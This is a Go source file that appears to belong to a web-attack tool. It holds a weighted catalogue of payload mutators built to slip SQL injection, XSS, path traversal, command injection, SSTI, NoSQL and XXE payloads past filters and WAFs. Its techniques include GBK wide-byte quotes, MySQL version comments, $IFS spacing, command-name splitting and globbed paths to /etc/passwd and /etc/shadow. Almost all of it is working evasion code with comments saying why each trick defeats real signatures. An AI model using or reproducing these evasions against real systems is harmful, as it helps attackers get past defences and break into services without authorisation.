package payload

import (
	"encoding/base64"
	"encoding/hex"
	"net/url"
	"strings"
)

// Mutators is the transformation catalogue.
//
// Every entry is a technique that a real filter is known to miss, not an
// invented one. They are grouped into families so that mutually exclusive
// rewrites (three different ways to hide a space, say) are never applied on top
// of each other, and weighted so the broadly useful ones are tried first.
var Mutators = []Mutator{
	// ---------------------------------------------------------------- encoding
	// Encoding is the first line of attack: a filter that matches raw bytes
	// loses to a request that is decoded before it reaches the parser.
	{
		Name: "urlencode", Family: "encoding", Weight: 10, ProducesEncoded: true,
		Apply: func(s string) string { return url.QueryEscape(s) },
	},
	{
		Name: "urlencode-specials", Family: "encoding", Weight: 11,
		Apply: func(s string) string {
			// Only the characters that a signature actually keys on. Encoding
			// everything is noisier and no more effective.
			return mapChars(map[byte]string{
				' ': "%20", '\'': "%27", '"': "%22", '<': "%3c", '>': "%3e",
				'/': "%2f", '\\': "%5c", '=': "%3d", '?': "%3f", '&': "%26",
				'(': "%28", ')': "%29", ';': "%3b", '|': "%7c", '`': "%60",
				'$': "%24", '#': "%23", '*': "%2a", '-': "%2d",
			})(s)
		},
	},
	{
		Name: "double-urlencode", Family: "encoding", Weight: 12, ProducesEncoded: true,
		Apply: func(s string) string { return url.QueryEscape(url.QueryEscape(s)) },
	},
	{
		Name: "sql-widebyte-quote", Family: "encoding", Weight: 11, ProducesEncoded: true,
		Kinds: []Kind{SQLi},
		Apply: func(s string) string {
			// On a GBK connection the two bytes 0xdf 0x27 are one character to the
			// escaping routine and two to the parser: the backslash the application
			// inserts becomes the second byte of a character, and the quote survives
			// to close the string. The bytes have to arrive as they are, so the whole
			// payload is returned in transport form with the lead byte written out
			// beside the encoded quote.
			//
			// Measured on MariaDB 11.8 over a GBK connection: the escaped statement
			// `... username = 'admin<0xdf><backslash>' or 1=1-- -'` returns every row,
			// where the same statement without the lead byte returns none.
			return strings.ReplaceAll(url.QueryEscape(s), "%27", "%df%27")
		},
	},
	{
		Name: "unicode-escape", Excludes: []Kind{XSS}, Family: "encoding", Weight: 13,
		Apply: mapChars(map[byte]string{
			'\'': `\u0027`, '"': `\u0022`, '<': `\u003c`, '>': `\u003e`,
			'/': `\u002f`, '\\': `\u005c`, '&': `\u0026`, '=': `\u003d`,
		}),
	},
	{
		Name: "html-entity", Excludes: []Kind{XSS}, Family: "encoding", Weight: 14,
		Kinds: []Kind{XSS, Generic},
		Apply: mapChars(map[byte]string{
			'<': "&#60;", '>': "&#62;", '\'': "&#39;", '"': "&quot;",
			'(': "&#40;", ')': "&#41;", '/': "&#47;",
		}),
	},
	{
		Name: "html-entity-hex", Excludes: []Kind{XSS}, Family: "encoding", Weight: 15,
		Kinds: []Kind{XSS},
		Apply: mapChars(map[byte]string{
			'<': "&#x3c;", '>': "&#x3e;", '\'': "&#x27;", '"': "&#x22;",
			'(': "&#x28;", ')': "&#x29;", '/': "&#x2f;",
		}),
	},
	{
		Name: "hex-escape", Excludes: []Kind{XSS}, Family: "encoding", Weight: 16,
		Apply: mapChars(map[byte]string{
			'\'': `\x27`, '"': `\x22`, '<': `\x3c`, '>': `\x3e`, '/': `\x2f`,
		}),
	},
	{
		Name: "case-swap", Family: "casing", Weight: 20,
		Apply: alternateCase,
	},
	{
		Name: "sql-comment-wrap", Family: "encoding", Weight: 17,
		Kinds: []Kind{SQLi, NoSQL},
		Apply: func(s string) string {
			// MySQL executes the contents of a version comment, so a keyword
			// hidden inside one still parses while a signature sees a comment.
			return strings.ReplaceAll(s, " ", "/*!*/")
		},
	},

	// ------------------------------------------------------------------ sql
	// The SQL family exploits the gap between what a signature considers a
	// keyword boundary and what the database does.
	{
		Name: "space-to-comment", Family: "sql-space", Weight: 30,
		Kinds: []Kind{SQLi},
		Apply: replaceAll(" ", "/**/"),
	},
	{
		Name: "space-to-plus", Family: "sql-space", Weight: 31,
		Kinds: []Kind{SQLi},
		Apply: replaceAll(" ", "+"),
	},
	{
		Name: "space-to-tab", Family: "sql-space", Weight: 32,
		Kinds: []Kind{SQLi, Command},
		Apply: replaceAll(" ", "%09"),
	},
	{
		Name: "space-to-newline", Family: "sql-space", Weight: 33,
		Kinds: []Kind{SQLi, Command},
		Apply: replaceAll(" ", "%0a"),
	},
	{
		Name: "space-to-vert-tab", Family: "sql-space", Weight: 34,
		Kinds: []Kind{SQLi},
		Apply: replaceAll(" ", "%0b"),
	},
	{
		Name: "and-or-to-operators", Family: "sql-logic", Weight: 35,
		Kinds: []Kind{SQLi},
		Apply: func(s string) string {
			// && and || are valid in MySQL and PostgreSQL, and are not what a
			// rule looking for " AND " expects.
			out := strings.ReplaceAll(s, " AND ", " && ")
			out = strings.ReplaceAll(out, " and ", " && ")
			out = strings.ReplaceAll(out, " OR ", " || ")
			out = strings.ReplaceAll(out, " or ", " || ")
			return out
		},
	},
	{
		Name: "keyword-split-union", Family: "sql-keyword", Weight: 36,
		Kinds: []Kind{SQLi},
		Apply: insertInKeyword("UNION", "/**/"),
	},
	{
		Name: "keyword-split-select", Family: "sql-keyword", Weight: 37,
		Kinds: []Kind{SQLi},
		Apply: insertInKeyword("SELECT", "/**/"),
	},
	{
		Name: "keyword-split-and", Family: "sql-keyword", Weight: 38,
		Kinds: []Kind{SQLi},
		Apply: insertInKeyword("AND", "/**/"),
	},
	{
		Name: "terminator-to-hash", Family: "sql-terminator", Weight: 39,
		Kinds: []Kind{SQLi},
		Apply: func(s string) string {
			// MySQL also ends a statement with #.
			out := strings.ReplaceAll(s, "-- -", "#")
			out = strings.ReplaceAll(out, "-- ", "#")
			return strings.TrimSuffix(out, "--")
		},
	},
	{
		// A filter that removes a keyword once, rather than refusing the request, turns this
		// back into the keyword: `SELSELECTECT` loses the inner `SELECT` and what is left is
		// what the query needed. Removing-once is what a sanitiser written as a single
		// replacement does — a WAF rule that matches the first occurrence, for instance.
		//
		// The keywords are the ones long enough to survive being split and the ones that do
		// not sit inside another word: `OR` is left out because two letters of it would chew
		// the middle out of `ORDER`.
		Name: "keyword-double-write", Family: "sql-keyword", Weight: 39,
		Kinds: []Kind{SQLi},
		Apply: func(s string) string {
			out := s
			for _, keyword := range []string{"UNION", "SELECT", "AND", "SLEEP"} {
				out = insertInKeyword(keyword, keyword)(out)
			}
			return out
		},
	},
	{
		Name: "terminator-to-block", Family: "sql-terminator", Weight: 40,
		Kinds: []Kind{SQLi},
		Apply: func(s string) string {
			return strings.ReplaceAll(s, "-- -", "/*")
		},
	},
	{
		// MySQL and MariaDB execute what a version comment contains, so a keyword inside one
		// still parses while a filter looking at the words does not see the clause it was
		// written for: `UNION SELECT` becomes `/*!50000UNION*/ /*!50000SELECT*/`, and a rule
		// matching the two together — which is what such a rule has to do to avoid matching
		// either word on its own — no longer matches. The version number is the point: 50000
		// runs on anything modern, and a number nobody runs turns the whole clause into an
		// ordinary comment instead.
		Name: "sql-version-comment", Family: "sql-keyword", Weight: 42,
		Kinds: []Kind{SQLi},
		Apply: func(s string) string {
			out := s
			for _, keyword := range []string{"UNION", "SELECT", "SLEEP", "BENCHMARK"} {
				out = replaceWholeWord(out, keyword, "/*!50000"+keyword+"*/")
			}
			return out
		},
	},
	{
		Name: "tautology-to-arithmetic", Family: "sql-logic", Weight: 41,
		Kinds: []Kind{SQLi},
		Apply: func(s string) string {
			// 1=1 is the most-signatured tautology there is; arithmetic and
			// string comparisons that evaluate the same way are not.
			//
			// Longer patterns first, and quoted forms before bare ones: the
			// bare "1=1" rule would otherwise chew the middle out of "1'='1"
			// and leave something that is no longer a comparison.
			out := s
			for _, pair := range [][2]string{
				{"'1'='1'", "'a'='a'"},
				{"'1'='2'", "'a'='b'"},
				{"\"1\"=\"1\"", "\"a\"=\"a\""},
				{"\"1\"=\"2\"", "\"a\"=\"b\""},
				{"'1'='1", "'a'='a"},
				{"'1'='2", "'a'='b"},
				{"\"1\"=\"1", "\"a\"=\"a"},
				{"\"1\"=\"2", "\"a\"=\"b"},
				{"1=1", "2-1=1"},
				{"1=2", "2-1=3"},
			} {
				out = strings.ReplaceAll(out, pair[0], pair[1])
			}
			return out
		},
	},
	{
		Name: "union-select-to-variant", Family: "sql-keyword", Weight: 42,
		Kinds: []Kind{SQLi},
		Apply: func(s string) string {
			// UNION DISTINCT is an accepted synonym for UNION in most engines.
			return strings.ReplaceAll(strings.ReplaceAll(s, "UNION ALL ", "UNION "), "UNION ", "UNION DISTINCT ")
		},
	},

	// ------------------------------------------------------------------ xss
	// Browsers are extremely forgiving about markup; signatures are not.
	{
		Name: "tag-case", Family: "xss-case", Weight: 50,
		Kinds: []Kind{XSS},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, "<script", "<ScRiPt")
			out = strings.ReplaceAll(out, "</script>", "</ScRiPt>")
			out = strings.ReplaceAll(out, "</SCRIPT>", "</ScRiPt>")
			out = strings.ReplaceAll(out, "<img", "<ImG")
			out = strings.ReplaceAll(out, "<svg", "<SvG")
			out = strings.ReplaceAll(out, "<body", "<BoDy")
			return out
		},
	},
	{
		Name: "event-case", Family: "xss-case", Weight: 51,
		Kinds: []Kind{XSS},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, "onerror", "OnErRoR")
			out = strings.ReplaceAll(out, "onload", "OnLoAd")
			out = strings.ReplaceAll(out, "alert", "AlErT")
			return out
		},
	},
	{
		Name: "tag-split-tab", Family: "xss-split", Weight: 52,
		Kinds: []Kind{XSS},
		Apply: func(s string) string {
			// A tab between the tag name and its attribute is legal HTML and
			// breaks a literal `<img src=` match.
			return strings.ReplaceAll(s, " ", "\t")
		},
	},
	{
		Name: "tag-split-newline", Family: "xss-split", Weight: 53,
		Kinds: []Kind{XSS},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, " ", "\n")
			out = strings.ReplaceAll(out, "<script\n", "<script\n")
			return out
		},
	},
	{
		Name: "tag-null-byte", Family: "xss-split", Weight: 54,
		Kinds: []Kind{XSS},
		Apply: func(s string) string {
			// Some parsers drop a NUL inside a tag name; the browser regex
			// crackweb targets does not.
			out := strings.ReplaceAll(s, "<script", "<scr%00ipt")
			out = strings.ReplaceAll(out, "<img", "<im%00g")
			return out
		},
	},
	{
		Name: "tag-split-slash", Family: "xss-split", Weight: 58,
		Kinds: []Kind{XSS},
		Apply: func(s string) string {
			// `/` separates attributes exactly as a space does, so the payload
			// still parses while a signature looking for " onerror=" or
			// " onfocus=" no longer matches it — and a filter that strips
			// whitespace inside a tag leaves this form working.
			return strings.ReplaceAll(s, " ", "/")
		},
	},
	{
		Name: "javascript-alert-variant", Family: "xss-js", Weight: 55,
		Kinds: []Kind{XSS},
		Apply: func(s string) string {
			// The marker has to stay recognisable to the check, so the
			// substitution keeps `alert` and the domain intact.
			out := strings.ReplaceAll(s, "alert(", "top['al'%2b'ert'](")
			out = strings.ReplaceAll(out, "document.domain", "document['dom'%2b'ain']")
			return out
		},
	},
	{
		Name: "svg-vector", Family: "xss-vector", Weight: 56,
		Kinds: []Kind{XSS},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, "<img src=x onerror=", "<svg/onload=")
			out = strings.ReplaceAll(out, "<img src=x OnErRoR=", "<svg/onload=")
			out = strings.ReplaceAll(out, "<body onload=", "<svg/onload=")
			out = strings.ReplaceAll(out, "<body OnLoAd=", "<svg/onload=")
			return out
		},
	},
	{
		Name: "mathml-vector", Family: "xss-vector", Weight: 57,
		Kinds: []Kind{XSS},
		Apply: func(s string) string {
			return strings.ReplaceAll(s, "<svg/onload=", "<math><mtext><table><mglyph><svg/onload=")
		},
	},

	// ------------------------------------------------------------ traversal
	{
		Name: "dots-encoded", Family: "trav-dots", Weight: 60,
		Kinds: []Kind{Traversal},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, "..", "%2e%2e")
			return strings.ReplaceAll(out, "/", "%2f")
		},
	},
	{
		Name: "dots-double-slash", Family: "trav-dots", Weight: 61,
		Kinds: []Kind{Traversal},
		Apply: func(s string) string {
			// `....//` survives a filter that strips one `../` by turning back
			// into `../` after removal.
			return strings.ReplaceAll(s, "../", "....//")
		},
	},
	{
		Name: "dots-idempotent-dot", Family: "trav-dots", Weight: 62,
		Kinds: []Kind{Traversal},
		Apply: func(s string) string {
			return strings.ReplaceAll(s, ".", "%2e")
		},
	},
	{
		Name: "dots-double-encoded", Family: "trav-dots", Weight: 63,
		Kinds: []Kind{Traversal},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, "..", "..%252f..")
			return out
		},
	},
	{
		Name: "slash-to-backslash", Family: "trav-sep", Weight: 64,
		Kinds: []Kind{Traversal},
		Apply: func(s string) string {
			return strings.ReplaceAll(s, "/", "\\")
		},
	},
	{
		Name: "dots-overlong-utf8", Family: "trav-dots", Weight: 65,
		Kinds: []Kind{Traversal},
		Apply: func(s string) string {
			// Overlong UTF-8 for `/` and `.`, which some decoders accept.
			out := strings.ReplaceAll(s, "/", "%c0%af")
			return strings.ReplaceAll(out, ".", "%c0%ae")
		},
	},
	{
		Name: "dots-to-unc", Family: "trav-sep", Weight: 66,
		Kinds: []Kind{Traversal},
		Apply: func(s string) string {
			if strings.Contains(strings.ToLower(s), "windows") || strings.Contains(s, "\\") {
				return s
			}
			return s
		},
	},

	// -------------------------------------------------------------- command
	{
		// The command name itself, split around `$@` — which expands to nothing outside a
		// function, so the shell still reads the command while a filter matching the word as
		// written does not. It is the shape that defeats a list of names, and a list of names
		// is what such a filter is: `cat`, `whoami`, `id`.
		Name: "cmd-split-command-name", Family: "cmd-name", Weight: 78,
		Kinds: []Kind{Command},
		Apply: splitCommandNames,
	},
	{
		Name: "cmd-space-to-ifs", Family: "cmd-space", Weight: 70,
		Kinds: []Kind{Command},
		Apply: replaceAll(" ", "$IFS"),
	},
	{
		Name: "cmd-space-to-ifs-brace", Family: "cmd-space", Weight: 71,
		Kinds: []Kind{Command},
		Apply: replaceAll(" ", "${IFS}"),
	},
	{
		Name: "cmd-brace-expansion", Family: "cmd-space", Weight: 72,
		Kinds: []Kind{Command},
		Apply: func(s string) string {
			// `{cat,/etc/passwd}` runs the same command with no space anywhere in
			// it: the shell expands the comma-separated list into separate words.
			// The arguments come from the last command in the payload, which is
			// the one the injection reaches.
			index := strings.LastIndex(s, ";")
			if index < 0 {
				return s
			}
			fields := strings.Fields(s[index+1:])
			if len(fields) < 2 {
				return s
			}
			return s[:index+1] + "{" + strings.Join(fields, ",") + "}"
		},
	},
	{
		Name: "cmd-space-to-tab", Family: "cmd-space", Weight: 73,
		Kinds: []Kind{Command},
		Apply: replaceAll(" ", "\t"),
	},
	{
		Name: "cmd-glob-path", Family: "cmd-path", Weight: 74,
		Kinds: []Kind{Command},
		Apply: func(s string) string {
			// `cat /etc/pass?d` reads the same file. The shell expands the glob
			// before the command runs, so a rule that matches the path literally —
			// or a signature that keys on it — is looking for a path that is not
			// there.
			for _, spelling := range cmdGlobPaths {
				if strings.Contains(s, spelling[0]) {
					return strings.Replace(s, spelling[0], spelling[1], 1)
				}
			}
			return s
		},
	},
	{
		Name: "cmd-quote-splice", Family: "cmd-lex", Weight: 75,
		Kinds: []Kind{Command},
		Apply: func(s string) string {
			// `c''at` is `cat`: the shell joins the word after removing the empty
			// quotes, so the command name never appears as one piece.
			return spliceFirstWord(s)
		},
	},
	{
		Name: "cmd-fuse-ifs-glob", Family: "cmd-fuse", Weight: 76,
		Kinds: []Kind{Command},
		Apply: func(s string) string {
			// Both hiding tricks in one payload: `${IFS}` for the space and `?` for
			// a character of the path. A rule written against the literal form has
			// to defeat both of them to see this one, and the shell expands both
			// back before the command runs.
			out := s
			for _, spelling := range cmdGlobPaths {
				if strings.Contains(out, spelling[0]) {
					out = strings.Replace(out, spelling[0], spelling[1], 1)
					break
				}
			}
			return strings.ReplaceAll(out, " ", "${IFS}")
		},
	},
	{
		Name: "cmd-separator-to-newline", Family: "cmd-sep", Weight: 73,
		Kinds: []Kind{Command},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, "; ", "%0a")
			return strings.ReplaceAll(out, ";", "%0a")
		},
	},
	{
		Name: "cmd-separator-to-amp", Family: "cmd-sep", Weight: 74,
		Kinds: []Kind{Command},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, "; ", "&&")
			return strings.ReplaceAll(out, ";", "&&")
		},
	},
	{
		Name: "cmd-separator-to-pipe", Family: "cmd-sep", Weight: 75,
		Kinds: []Kind{Command},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, "; ", "|")
			return strings.ReplaceAll(out, ";", "|")
		},
	},
	{
		Name: "cmd-wrap-backtick", Family: "cmd-wrap", Weight: 76,
		Kinds: []Kind{Command},
		Apply: func(s string) string {
			return "`" + strings.TrimSpace(strings.TrimPrefix(strings.TrimSpace(s), ";")) + "`"
		},
	},
	{
		Name: "cmd-wrap-dollar-paren", Family: "cmd-wrap", Weight: 77,
		Kinds: []Kind{Command},
		Apply: func(s string) string {
			return "$(" + strings.TrimSpace(strings.TrimPrefix(strings.TrimSpace(s), ";")) + ")"
		},
	},

	// ----------------------------------------------------------------- ssti
	{
		Name: "ssti-brace-space", Family: "ssti-syntax", Weight: 80,
		Kinds: []Kind{SSTI},
		Apply: func(s string) string {
			// `{{ 7*7 }}` is the same expression with whitespace a signature
			// may not expect.
			out := strings.ReplaceAll(s, "{{", "{{ ")
			out = strings.ReplaceAll(out, "}}", " }}")
			return out
		},
	},
	{
		Name: "ssti-concat-operand", Family: "ssti-syntax", Weight: 81,
		Kinds: []Kind{SSTI},
		Apply: func(s string) string {
			// Break the multiplication into a concatenation of literals so the
			// literal digits never appear together.
			out := strings.ReplaceAll(s, "1999*1999", "(1900%2b99)*(2000-1)")
			return strings.ReplaceAll(out, "+", "%2b")
		},
	},

	// ---------------------------------------------------------------- nosql
	{
		Name: "nosql-json-escape", Family: "nosql-syntax", Weight: 90,
		Kinds: []Kind{NoSQL},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, "\"", "\\u0022")
			return strings.ReplaceAll(out, "$", "\\u0024")
		},
	},
	{
		Name: "nosql-operator-case", Family: "nosql-syntax", Weight: 91,
		Kinds: []Kind{NoSQL},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, "$ne", "$NE")
			return strings.ReplaceAll(out, "$gt", "$GT")
		},
	},

	// ------------------------------------------------------------------ xxe
	// An XML parser is case-sensitive about element names but not about the
	// keywords inside a doctype, so a filter that matches `<!ENTITY` literally
	// can be walked past while the document still parses.
	{
		Name: "xml-doctype-case", Family: "xml-keyword", Weight: 100,
		Kinds: []Kind{XXE},
		Apply: func(s string) string {
			return strings.ReplaceAll(s, "<!DOCTYPE", "<!DoCtYpE")
		},
	},
	{
		Name: "xml-entity-case", Family: "xml-keyword", Weight: 101,
		Kinds: []Kind{XXE},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, "<!ENTITY", "<!EnTiTy")
			return strings.ReplaceAll(out, "<!entity", "<!EnTiTy")
		},
	},
	{
		Name: "xml-system-case", Family: "xml-keyword", Weight: 102,
		Kinds: []Kind{XXE},
		Apply: func(s string) string {
			out := strings.ReplaceAll(s, "SYSTEM", "SyStEm")
			return strings.ReplaceAll(out, "system", "SyStEm")
		},
	},
	{
		Name: "xml-whitespace", Family: "xml-space", Weight: 103,
		Kinds: []Kind{XXE},
		Apply: func(s string) string {
			// XML allows arbitrary whitespace inside a doctype declaration.
			out := strings.ReplaceAll(s, "<!DOCTYPE ", "<!DOCTYPE\t")
			return strings.ReplaceAll(out, " [", "\n[")
		},
	},
	{
		Name: "xml-utf16-decl", Family: "xml-keyword", Weight: 104,
		Kinds: []Kind{XXE},
		Apply: func(s string) string {
			// Claiming UTF-16 while sending UTF-8 defeats filters that decode
			// the body according to the declaration before matching.
			return strings.ReplaceAll(s, `encoding="UTF-8"`, `encoding="UTF-16"`)
		},
	},

	// ------------------------------------------------------------ structural
	{
		// Excluded from commands as well as XSS: a shell does not decode base64 or
		// hex, so the variant could only ever reach a target that decodes the value
		// itself — and spending a generation's budget on it costs the mutations that
		// do work.
		Name: "base64-wrap", Excludes: []Kind{XSS, Command}, Family: "encoding", Weight: 18,
		Apply: func(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) },
	},
	{
		Name: "hex-encode-all", Excludes: []Kind{XSS, Command}, Family: "encoding", Weight: 19,
		Apply: func(s string) string { return hex.EncodeToString([]byte(s)) },
	},
}

// cmdGlobPaths are spellings a shell expands to the same file. A filter that
// blocks the literal path has blocked a spelling of it, not the file — which is
// what makes `cat /etc/pass?d` worth sending.
// cmdSplittableNames are the commands a filter is likely to be written for.
var cmdSplittableNames = []string{
	"cat", "whoami", "uname", "id", "type", "ls", "dir", "ping", "nslookup", "host",
	"curl", "wget", "nc", "base64", "powershell",
}

// splitCommandNames splits each known command name on `$@`, which the shell expands to
// nothing outside a function: `cat` becomes `c$@at` and runs exactly as before, while a
// filter that matched the word does not see it.
func splitCommandNames(s string) string {
	out := s
	for _, name := range cmdSplittableNames {
		split := len(name) / 2
		out = replaceWholeWord(out, name, name[:split]+"$@"+name[split:])
	}
	return out
}

// isShellWordChar reports whether c continues a word the way a shell and a regular
// expression agree it does: letters, digits and the underscore. It is wider than
// isWordLetter on purpose — `id_rsa` is one word to both a shell and `\\b`, and splitting
// the `id` inside it would turn a file name into something the shell cannot read.
func isShellWordChar(c byte) bool {
	return c == '_' || (c >= '0' && c <= '9') || isWordLetter(c)
}

// replaceWholeWord replaces occurrences of word that stand alone.
func replaceWholeWord(s, word, replacement string) string {
	var b strings.Builder
	for i := 0; i < len(s); {
		if !isShellWordChar(s[i]) {
			b.WriteByte(s[i])
			i++
			continue
		}
		start := i
		for i < len(s) && isShellWordChar(s[i]) {
			i++
		}
		if segment := s[start:i]; segment == word {
			b.WriteString(replacement)
		} else {
			b.WriteString(segment)
		}
	}
	return b.String()
}

var cmdGlobPaths = [][2]string{
	{"/etc/passwd", "/etc/pass?d"},
	{"/etc/passwd", "/etc/pass*"},
	{"/etc/shadow", "/etc/shado?"},
	{"/etc/hosts", "/etc/host?"},
	{"/bin/sh", "/bin/s?"},
	{"/windows/win.ini", "/windows/win.in?"},
}

// spliceFirstWord splits the first word of a payload with empty quotes, so that
// `sleep` becomes `s”leep`. The shell removes the quotes while joining the word,
// and a signature looking for the command name does not see it whole.
func spliceFirstWord(s string) string {
	start := 0
	for start < len(s) && !isWordLetter(s[start]) {
		start++
	}
	end := start
	for end < len(s) && isWordLetter(s[end]) {
		end++
	}
	if end-start < 2 {
		return s
	}
	return s[:start+1] + "''" + s[start+1:]
}

// isWordLetter reports whether a byte can be part of a command name.
func isWordLetter(c byte) bool {
	return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
}

// MutatorsFor returns the mutators that apply to a kind, ordered by weight.
func MutatorsFor(kind Kind) []Mutator {
	var out []Mutator
	for _, m := range Mutators {
		if m.matches(kind) {
			out = append(out, m)
		}
	}
	// Stable insertion sort by weight: the catalogue is small and this keeps
	// the ordering deterministic without pulling in a sort dependency here.
	for i := 1; i < len(out); i++ {
		for j := i; j > 0 && out[j].Weight < out[j-1].Weight; j-- {
			out[j], out[j-1] = out[j-1], out[j]
		}
	}
	return out
}

// MutatorByName looks a mutator up.
func MutatorByName(name string) (Mutator, bool) {
	lower := strings.ToLower(strings.TrimSpace(name))
	for _, m := range Mutators {
		if m.Name == lower {
			return m, true
		}
	}
	return Mutator{}, false
}

// MutatorNames lists every mutator, for help output and diagnostics.
func MutatorNames() []string {
	out := make([]string, 0, len(Mutators))
	for _, m := range Mutators {
		out = append(out, m.Name)
	}
	return out
}
